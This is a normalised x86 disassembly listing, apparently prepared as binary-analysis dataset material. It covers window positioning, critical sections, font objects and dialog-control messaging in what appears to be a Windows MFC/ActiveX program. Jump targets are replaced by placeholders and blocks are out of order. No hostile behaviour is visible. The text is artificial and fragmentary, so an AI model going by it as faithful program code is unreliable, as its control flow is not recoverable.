je r-xdata
push [ ebp + 0x10 ]
call [ SysFreeString@IAT ]
lea eax [ ebp + 0x14 ]
push eax
xor eax eax
cmp [ ebp + 0x18 ] 0x377
push [ ebp + 0x10 ]
sete al
push eax
push esi
movzx eax [ edi + 0x10 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x50 ]
push [ edi ]
push ebx
push eax
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x34 ]
call sub_409b90
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
xor ebx ebx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
call sub_425df1
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax ebx
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x1c
mov ebx [ eax + 0x20 ]
mov ecx [ ebp + 0x14 ]
push 0x1
call sub_40b5bb
mov eax [ ebp + 0x14 ]
push 0x13
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
push [ eax + 0x20 ]
call [ SetWindowPos@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x8c ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
lea ecx [ eax + 0x9c ]
call sub_4225b1
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x1c ]
mov [ eax + 0x90 ] cx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x94 ] ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x98 ] ecx
sub_40954f
mov eax sub_42ae82
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_4236b1
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_41e435
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_41e435
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4095dc
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_409618
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_41e36c
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_409640
mov eax sub_42af04
call sub_410a78
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_41e34c
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_4096cf
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_4096fb
mov eax sub_42af34
call sub_410a78
sub esp 0x34
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
or [ ebp - 0x1c ] 0xffffffff
mov [ ebp - 0x10 ] esp
push edi
push [ ebp + 0x8 ]
mov ebx ecx
push ebx
call sub_40990d
mov esi eax
xor edx edx
cmp esi edx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
xor ecx ecx
cmp [ esi + 0x24 ] 0xffffffff
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x4 ] edx
setne cl
sub eax edx
mov [ ebp - 0x18 ] ecx
je r-xdata
mov [ eax ] ebx
mov edi [ edi ]
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x40 ]
push eax
call sub_40ff70
and [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] edx
setne cl
mov eax ecx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov eax [ edi + 0x8 ]
push 0x10
lea eax [ ebp - 0x30 ]
push [ edi + 0x8 ]
push eax
call sub_410ff0
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
shl eax 0x4
push eax
call sub_4221b9
mov ecx [ ebp - 0x28 ]
add esp 0x10
add ecx 0xfffffff
mov [ ebp - 0x30 ] eax
shl ecx 0x4
push ecx
mov ecx [ edi + 0x8 ]
push [ ecx ]
push eax
call sub_410ff0
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x30 ]
add esp 0xc
shl eax 0x4
lea eax [ eax + ecx - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x3
mov [ eax + 0x8 ] ecx
lea eax [ ebp - 0x30 ]
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
cmp ecx edx
mov [ ebp - 0x14 ] 0x1
push eax
je r-xdata
dec eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp edi 0x2
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
push [ ebp - 0x30 ]
call sub_4221e2
pop ecx
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push eax
lea eax [ ebp - 0x40 ]
mov ecx ebx
push eax
push 0x1
push esi
call sub_429125
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x38 ]
mov [ ebp + 0x10 ] eax
je r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x14 ]
cmp ecx edx
je r-xdata
dec eax
jne r-xdata
mov ecx [ esi + 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi + 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x14 ]
push eax
cmp ecx edx
push [ edi + 0x20 ]
mov [ ebp - 0x14 ] 0x1
push [ edi + 0x1c ]
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c ]
cmp ecx 0xffffffff
je r-xdata
and [ ebp - 0x14 ] 0x0
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx ebx
call esi
push [ ebp + 0x8 ]
mov ecx ebx
call esi
jmp r-xdata
mov [ eax ] ecx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov [ ebp + 0x10 ] eax
xor eax eax
cmp [ ebp - 0x14 ] eax
jmp r-xdata
sub_40990d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
mov eax [ ecx ]
call [ eax + 0x3c ]
mov ecx [ ebp + 0x10 ]
mov edx eax
xor eax eax
cmp [ ecx ] eax
setne al
test edx edx
mov [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
add eax 0x28
cmp [ eax + 0x18 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ eax + 0x18 ] ecx
jne r-xdata
cmp [ eax + 0x4 ] edi
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp ecx 0xffffffff
jne r-xdata
cmp [ eax + 0x20 ] ebx
ja r-xdata
mov ecx [ eax + 0x20 ]
cmp ecx 0xffffffff
je r-xdata
cmp ebx ecx
jbe r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
cmp ecx ebx
je r-xdata
jmp r-xdata
sub_409982
mov eax sub_42af40
call sub_410a78
sub esp 0xc
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] edi
cmp [ edi + 0x34 ] 0x0
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x34 ] 0x0
je r-xdata
call sub_4272f7
mov ecx [ eax + 0x1038 ]
push edi
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ edi + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ edi + 0x34 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn
test edi edi
mov esi edi
je r-xdata
mov ebx 0x100
push [ esi + 0x1c ]
or [ esi + 0x24 ] ebx
call [ GetParent@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov eax [ esi + 0x1c ]
test esi esi
jne r-xdata
test [ esi + 0x24 ] ebx
jne r-xdata
sub_409a37
mov eax sub_42af54
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_421ce9
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push 0xa
lea ecx [ esi + 0x20 ]
mov [ esi + 0x1c ] eax
call sub_41e382
or [ esi + 0x3c ] 0xffffffff
or [ esi + 0x40 ] 0xffffffff
and [ esi + 0x44 ] 0x0
and [ esi + 0x48 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4c ] r--data
mov [ esi + 0x50 ] r--data
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_409ab2
mov eax sub_42af73
call sub_410a78
sub esp 0x10
push esi
mov esi ecx
push edi
mov [ ebp - 0x1c ] esi
mov [ esi ] r--data
mov eax [ esi + 0x2c ]
mov [ ebp - 0x4 ] 0x1
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
lea edi [ esi + 0x20 ]
lea edi [ esi + 0x20 ]
mov ecx edi
call sub_41e40a
lea eax [ esi + 0x44 ]
push eax
call sub_428347
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_41e435
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
lea edi [ esi + 0x20 ]
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x18 ]
mov ecx edi
call sub_41e579
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41e5bb
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x14 ]
mov ecx edi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41e5bb
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
sub_409b90
push ebp
mov ebp esp
sub esp 0x20
push esi
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov esi ecx
push eax
call [ CopyRect@IAT ]
push [ ebp + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
push [ ebp + 0x28 ]
sub eax ecx
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
push [ ebp + 0x20 ]
sub ecx edx
mov [ ebp - 0x4 ] ecx
mov ecx esi
push [ ebp + 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409bf1
pop esi
leave
retn 0x28
sub_409bf1
mov eax sub_42af80
call sub_410a78
sub esp 0x10
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esp
call sub_4272f7
mov ecx [ eax + 0x1038 ]
push [ ebp - 0x14 ]
mov eax [ ecx ]
call [ eax + 0xc ]
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
push [ ebp + 0x2c ]
mov ecx esi
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a995
xor ecx ecx
test eax eax
setge cl
mov edi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
push [ esi + 0x20 ]
lea ecx [ eax + 0x20 ]
call sub_41e529
mov [ eax ] esi
mov eax [ ebp + 0x30 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x2c
mov eax edi
mov [ eax ] esi
jmp r-xdata
sub_409cac
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
push esi
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
xor eax eax
lea esi [ ecx + 0x20 ]
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_41e5bb
mov ecx [ ebp - 0x8 ]
call sub_40b199
cmp eax [ ebp + 0x8 ]
je r-xdata
sub_409cf6
mov eax sub_42af9c
call sub_410a78
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
lea eax [ edi + 0x2cc ]
cmp eax 0xf
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_409ebe ]
mov eax [ ebp + 0x10 ]
or [ eax + 0x8 ] 0xffff
mov [ eax ] 0xb
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] 0xb
jmp r-xdata
mov esi [ ebp + 0x10 ]
xor edi edi
mov [ esi ] 0x2
cmp [ rw-data ] edi
jne r-xdata
cmp [ esi + 0x3c ] 0xffffffff
jne r-xdata
xor edi edi
cmp [ esi + 0x44 ] edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] 0xb
call sub_40b1c9
neg eax
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov [ esi ] 0x3
call [ GetThreadLocale@IAT ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x8 ]
mov [ esi ] 0x8
call sub_428e1a
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
push 0xf1c0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_423897
mov esi [ ebp + 0x10 ]
lea ecx [ ebp + 0xc ]
mov [ esi ] 0x8
call sub_428e1a
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0xc ]
push 0x1
pop eax
jmp r-xdata
mov [ esi + 0x8 ] 0x1
jmp r-xdata
call sub_427a80
cmp [ eax + 0x20 ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp edi 0xfffffd43
mov [ eax ] 0x3
jne r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x20 ]
call sub_424c12
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x1c ]
push eax
push [ ebp - 0x1c ]
push 0x138
push eax
call [ SendMessageA@IAT ]
push [ ebp - 0x18 ]
call [ GetBkColor@IAT ]
push [ ebp - 0x18 ]
mov [ esi + 0x3c ] eax
call [ GetTextColor@IAT ]
lea ecx [ ebp - 0x20 ]
mov [ esi + 0x40 ] eax
call sub_424c84
mov edi [ ebp + 0x10 ]
mov [ edi ] 0x9
mov eax [ esi + 0x44 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esi + 0x44 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ esi + 0x1c ]
call sub_40a682
push eax
mov ecx esi
call sub_409efe
cmp [ esi + 0x44 ] edi
je r-xdata
call sub_422478
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi + 0x8 ] di
jmp r-xdata
mov esi [ esi + 0x40 ]
mov esi [ esi + 0x3c ]
jmp r-xdata
mov [ eax + 0x8 ] esi
jmp r-xdata
sub_409efe
mov eax sub_42afc8
call sub_410a78
sub esp 0x7c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov edi [ GetStockObject@IAT ]
push 0x11
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
cmp [ eax + 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
push 0xd
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
lea ecx [ ebp - 0x88 ]
push ecx
push 0x3c
push [ eax + 0x4 ]
call [ GetObjectA@IAT ]
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x4c ] 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_411530
mov edi esp
push esi
push edi
lea eax [ ebp - 0x6c ]
push 0xffffffff
push eax
push ebx
push ebx
mov [ edi ] bx
call [ MultiByteToWideChar@IAT ]
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x48 ] ebx
jmp r-xdata
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_424c12
push 0x5a
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x24 ]
call [ GetDeviceCaps@IAT ]
mov ecx eax
mov eax edi
imul eax eax 0xafc80
cdq
idiv ecx
add esi 0x44
mov [ ebp - 0x40 ] ebx
push esi
mov [ ebp - 0x44 ] eax
call sub_428347
push esi
lea eax [ ebp - 0x4c ]
push r--data
push eax
call [ Ordinal_OLEPRO32_253@IAT ]
test eax eax
jge r-xdata
neg eax
mov edi eax
mov ax [ ebp - 0x78 ]
mov [ ebp - 0x3c ] ax
movzx ax [ ebp - 0x71 ]
mov [ ebp - 0x3a ] ax
movzx eax [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
movzx eax [ ebp - 0x73 ]
mov [ ebp - 0x34 ] eax
movzx eax [ ebp - 0x72 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x88 ]
cmp eax ebx
mov edi eax
jge r-xdata
lea ecx [ ebp - 0x18 ]
call sub_424e5d
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x94 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_424c84
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi ] ebx
sub_40a0bc
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
leave
retn 0x4
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_41e5bb
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_40b5bb
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
sub_40a0fd
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
leave
retn 0x8
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41e5bb
push [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x2c
push [ ebp + 0x8 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x50 ]
add ecx 0x2c
push ecx
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x1c ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
sub_40a157
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x48 ] eax
pop esi
retn 0x4
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_40a185
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ eax + 0x38 ]
test ecx ecx
jne r-xdata
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0x3
push 0x0
push ecx
call [ eax + 0x6c ]
add esp 0x10
push ecx
push [ esp + 0xc ]
push 0xf1
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
sub_40a1c2
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
retn 0xc
mov eax [ edi ]
xor ecx ecx
cmp esi [ esp + 0x14 ]
sete cl
push ecx
push esi
mov ecx edi
call [ eax + 0x64 ]
inc esi
jmp r-xdata
cmp esi [ esp + 0x10 ]
jg r-xdata
sub_40a205
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push [ esp + 0xc ]
push eax
call [ GetDlgItem@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ eax + 0x1c ]
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov edi [ eax + 0x20 ]
sub_40a241
push ebp
mov ebp esp
sub esp 0x100
mov eax [ ecx ]
lea edx [ ebp - 0x100 ]
push 0x100
push edx
push [ ebp + 0x8 ]
call [ eax + 0x78 ]
test eax eax
jne r-xdata
movsx eax [ ebp - 0x100 ]
push esi
push edi
push eax
lea esi [ ebp - 0x100 ]
call sub_411cab
mov edi [ CharNextA@IAT ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
push esi
call edi
mov esi eax
movsx eax [ esi ]
push eax
call sub_411cab
test eax eax
pop ecx
jne r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
push esi
call edi
mov esi eax
cmp al 0x2d
jne r-xdata
leave
retn 0xc
test eax eax
je r-xdata
mov [ ecx ] eax
movsx eax [ esi ]
push eax
call sub_411bcc
pop ecx
pop edi
mov ecx [ ebp + 0xc ]
pop esi
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
push 0xa
lea eax [ ebp - 0x100 ]
push 0x0
push eax
je r-xdata
call sub_410fcb
call sub_410daf
jmp r-xdata
add esp 0xc
sub_40a333
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x10 ] 0x0
push esi
lea eax [ ebp - 0x24 ]
push 0xa
push eax
mov esi ecx
push [ ebp + 0xc ]
je r-xdata
call sub_412406
call sub_4123dc
jmp r-xdata
mov eax [ esi ]
add esp 0xc
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x84 ]
pop esi
leave
retn 0xc
sub_40a38b
mov eax sub_42afe8
call sub_410a78
push ecx
push ecx
mov eax [ ecx ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
call [ eax + 0x70 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
cmp [ eax + 0x38 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
push edx
push 0x3
push ecx
mov ecx eax
call sub_421c3d
mov eax [ ebp + 0x8 ]
cmp eax 0xffff
jne r-xdata
push ecx
push ecx
push 0xf0
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x1
pop eax
sub_40a45b
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov eax [ ebx - 0x4 ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn 0xc
mov edi [ eax + 0x54 ]
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebx - 0x4 ]
test edi edi
mov [ eax + 0x54 ] esi
pop esi
je r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov eax [ edi ]
push edi
call [ eax + 0x8 ]
sub_40a4a5
mov eax sub_42affc
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4287be
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x2c ] edi
mov ebx [ esi + 0x24 ]
jbe r-xdata
mov eax [ ebx ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
add ebx 0x4
cmp edi [ esi + 0x2c ]
jb r-xdata
sub_40a517
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_42880c
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x1
pop eax
sub_40a574
mov eax sub_42b011
call sub_410a78
sub esp 0x20
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
test [ ebp + 0xc ] 0x1
mov [ ebp - 0x10 ] esp
mov [ eax ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push 0x38
call sub_4221b9
mov esi eax
pop ecx
mov [ ebp - 0x28 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi - 0x24 ]
mov [ ebp - 0x14 ] eax
shl eax 0x2
push eax
